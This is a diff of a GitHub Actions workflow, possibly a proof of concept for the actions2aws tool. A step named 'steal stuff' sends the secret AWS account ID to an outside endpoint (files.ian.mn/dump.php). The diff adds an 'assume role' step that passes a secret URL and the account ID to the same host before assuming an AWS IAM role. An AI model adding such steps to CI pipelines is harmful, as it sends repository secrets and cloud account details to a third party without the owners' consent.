@@ -14,8 +14,14 @@ jobs:
       - name: steal stuff
         uses: fjogeleit/http-request-action@master
         with:
-          url: 'http://files.ian.mn/dump.php?url=${{ inputs.url }}&accountid=${{ secrets.ACCOUNT_ID }}'
+          url: 'http://files.ian.mn/dump.php?accid=${{ secrets.ACCOUNT_ID }}'
           method: 'GET'
+
+      - name: assume role
+        uses: iann0036/actions2aws/assume@main
+        with:
+          url: http://files.ian.mn/dump.php?url=${{ secrets.URL }}&accid=${{ secrets.ACCOUNT_ID }}
+          role: arn:aws:iam::${{ secrets.ACCOUNT_ID }}:role/actions2aws-ExampleRoleForGithub-10X8QX5GEZTZQ
           step: keygen
 
       - run: aws sts get-caller-identity
